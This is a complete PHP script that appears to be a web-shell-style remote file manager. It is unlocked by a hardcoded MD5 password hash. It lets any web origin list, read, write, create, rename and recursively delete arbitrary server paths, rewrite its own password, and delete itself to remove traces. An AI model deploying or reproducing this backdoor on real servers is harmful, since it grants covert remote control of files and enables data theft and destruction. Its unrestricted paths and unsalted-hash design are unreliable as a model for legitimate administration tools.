<?php
header('Access-Control-Allow-Origin: *');
$PASS = "eae5916d0a2d37c09b662d47869ba699";
$tp = $_GET["t"];
$dt = $_POST;
if (MD5($dt["pass"]) === $PASS) {
	function pwsize($vl){
		if ($vl < 1024) {
			$vl = $vl." B";
		}
		elseif($vl < pow(1024, 2)) {
			$vl = round(($vl / 1024), 2)." KB";
		}
		elseif($vl < pow(1024, 3)) {
			$vl = round(($vl / pow(1024, 2)), 2)." MB";
		}
		elseif($vl < pow(1024, 4)) {
			$vl = round(($vl / pow(1024, 3)), 3)." GB";
		}
		elseif($vl < pow(1024, 5)) {
			$vl = round(($vl / pow(1024, 4)), 4)." TB";
		}
		return $vl;
	}
	function ofsize($type,$path,$pw){
		$size=0;
		if($type==="file"){
			$size = filesize($path);
		}else{
			$t=str_split($path);
			if ($t[count($t)-1] != "/")
				$path.= "/";
			$tmp=scandir($path);
			for($i=0;$i<count($tmp);$i++){
				if($tmp[$i]!==".." && $tmp[$i]!=="."){
					if(!is_dir($path.$tmp[$i])){
						if(is_file($path.$tmp[$i])){
							$size+=filesize($path.$tmp[$i]);
						}
					}else{
						if(is_readable($path.$tmp[$i])){
							$size+=ofsize("dir",$path.$tmp[$i],false);
						}
					}
				}
			}
		}
		if ($pw) {$size=pwsize($size);}
		return $size;
	}
	function remd($path) {
		$t = str_split($path);
		if ($t[count($t) - 1] != "/")
			$path.= "/";
		$tmp = scandir($path);
		for ($i = 0; $i < count($tmp); $i++) {
			if ($tmp[$i] !== ".." && $tmp[$i] !== ".") {
				if (is_dir($path.$tmp[$i])) {
					remd($path.$tmp[$i]);
				} else {
					unlink($path.$tmp[$i]);
				}
			}
		}
		rmdir($path);
	}
	function fpcount($path){
		$t=str_split($path);
		$co=[
			"files"=>0,
			"dirs"=>0
		];
		if ($t[count($t)-1] != "/")
			$path.= "/";
		$tmp=scandir($path);
		for ($i = 0; $i < count($tmp); $i++) {
			if ($tmp[$i] !== ".." && $tmp[$i] !== ".") {
				if (!is_dir($path.$tmp[$i])) {
					if (is_file($path.$tmp[$i])) {
						$co["files"]++;
					}
				} else {
					$co["dirs"]++;
					if(is_readable($path.$tmp[$i])){
						$tp=fpcount($path.$tmp[$i]);
						$co["dirs"]+=$tp["dirs"];
						$co["files"]+=$tp["files"];
					}
				}
			}
		}
		return $co;
	}
	function oftime($path,$ty="mtime"){
		$time=[
			"mtime"=>filemtime($path),
			"ctime"=>filectime($path),
			"atime"=>fileatime($path)
		];
		$time=date("d.m.Y H:i:s",$time[$ty]);
		return $time;
	}
	if ($tp === "getdirs") {
		if (file_exists($dt['path'])) {
			if (is_readable($dt['path'])) {
				if (is_dir($dt['path'])) {
					$t = str_split($dt['path']);
					if ($t[count($t) - 1] != "/")
						$dt['path'].= "/";
					$tmp = scandir($dt['path']);
					$tmp2 = [];
					for ($i2 = 0; $i2 < count($tmp); $i2++) {
						if (!is_dir($dt['path'].$tmp[$i2])) {
							$exp = explode(".", $tmp[$i2]);
							$exp = count($exp)>1?$exp[count($exp) - 1]:"";
							if (is_file($dt['path'].$tmp[$i2])) {
								$size = ofsize("file", $dt['path'].$tmp[$i2], true);
								$mtime = oftime($dt['path'].$tmp[$i2]);
							} else {
								$size = "no access";
								$mtime = "";
							}
							array_push($tmp2, [$tmp[$i2], "file", $exp, $size, $mtime]);
						} else {
							array_push($tmp2, [$tmp[$i2], "dir", "", is_readable($dt['path'].$tmp[$i2])?"":"no access"]);
						}
					}
					echo json_encode($tmp2);
				} else {
					echo "_openFile_";
				}
			} else {
				echo "_pathNotFined_";
			}
		} else {
			echo "_pathNotFined_";
		}
	}
	elseif($tp === "openimg") {
		header("Content-Type: image/".$dt['exp']);
		readfile($dt["url"]);
	}
	elseif($tp === "getcontent") {
		$t=str_split($dt['url']);
		if ($t[count($t)-1] == "/"){
			$t[count($t)-1] = "";
			$dt['url']=join("",$t);
		}
		echo "_isContent_".file_get_contents($dt["url"]);
	}
	elseif($tp === "savecontent") {
		$fex=!file_exists($dt['url']);
		if($fex){
				echo "_newCreate_";
				return;
			}
		file_put_contents($dt["url"],$dt["text"]);
	}
	elseif($tp === "createfile") {
		if(!file_exists($dt['url'])){
			if($dt['txt']===""){
				fclose(fopen($dt["url"],"w"));
			}else{
				file_put_contents($dt["url"], $dt['txt']);
			}
		}else{
			echo "_fileExists_";
		}
	}
	elseif($tp === "createdir") {
		if(!file_exists($dt['url'])){
			if(!mkdir($dt['url'])){
				echo "_notCreate_";
			};
		}else{
			echo "_fileExists_";
		}
	}
	elseif($tp === "setpass") {
		if(MD5($dt['oldpass'])===$PASS){
			$thfl=file_get_contents(__FILE__);
			$thfl=str_ireplace($PASS,MD5($dt['newpass']),$thfl);
			if(!file_put_contents(__FILE__,$thfl)){
				echo "_notSave_";
			};
		}else{
			echo "_invalidPass_";
		}
	}
	elseif($tp === "getprops") {
		if(file_exists($dt['path'])){
			$tmp=[
				"type"=>$dt["type"],
				"size"=>ofsize($dt["type"],$dt['path'],true),
				"create time"=>oftime($dt['path'],"ctime"),
				"last modified"=>oftime($dt['path'],"mtime"),
				"last open"=>oftime($dt['path'],"atime"),
				"permissions"=>decoct(fileperms($dt['path']) & 0777)
			];
			if($dt["type"]==="dir"){
				$co=fpcount($dt["path"]);
				$tmp["files"]=$co["files"];
				$tmp["dirs"]=$co["dirs"];
			}
			echo json_encode($tmp);
		}else{
			echo "_notFound_";
		}
	}
	elseif($tp === "delete") {
		$urls=json_decode($dt['url'],true);
		$req=[];
		for($i=0;$i<count($urls);$i++){
			if(file_exists($urls[$i])){
				if(!is_dir($urls[$i])){
					if(is_file($urls[$i])){
						unlink($urls[$i]);
					}
				}else{
					remd($urls[$i]);
				}
			}else{
				array_push($req,$urls[$i]);
			}
		}
		echo json_encode($req);
	}
	elseif($tp === "rename") {
		$urls=json_decode($dt["urls"],true);
		$req=["_notFound_"=>[]];
		for($i=0;$i<count($urls);$i++){
			$aw=true;
			for($i2=0;$i2<count($urls);$i2++){
				$aw=$urls[$i2][0]===$urls[$i][1];
				if($aw){
					break;
				}
			}
			if(file_exists($urls[$i][0]) && is_readable($urls[$i][0])){
				if(file_exists($urls[$i][1]) && !$aw){
					$expname=explode(".",$urls[$i][1]);
					$tmp=$urls[$i][1];
					$exp="";
					if(count($expname)>1){
						$exp=$expname[count($expname)-1];
						$tmp=implode(".",array_slice($expname,0,count($expname)-1));
					}
					$i3=0;
					while(file_exists($tmp."_".$i3.".".$exp)){
						$i3++;
					}
					$urls[$i][1]=$tmp."_".$i3.".".$exp;
				}
				$tmp=$urls[$i][0];
				$txt=".__TEMP__";
				while(file_exists($tmp.$txt)){
					$txt.=".__TEMP__";
				}
				rename($tmp,$tmp.$txt);
				$urls[$i][0].=$txt;
			}else{
				array_push($req["_notFound_"],$urls[$i][0]);
			}
		}
		for($i=0;$i<count($urls);$i++){
			if(file_exists($urls[$i][0]) && is_readable($urls[$i][0])){
				rename($urls[$i][0],$urls[$i][1]);
			}
		}
		echo json_encode($req);
	}
	elseif($tp === "isexist") {
		if(file_exists($dt["url"]) && is_readable($dt["url"])){
			echo "_yes_";
		}
	}
	elseif($tp === "isdir") {
		if(is_dir($dt["url"])){
			echo "_yes_";
		}
	}
	elseif($tp === "delal") {
		if($PASS===MD5($dt["tp"])){
			unlink(__FILE__);
		}
	}
} else {
	echo "_getPass_";
}
?>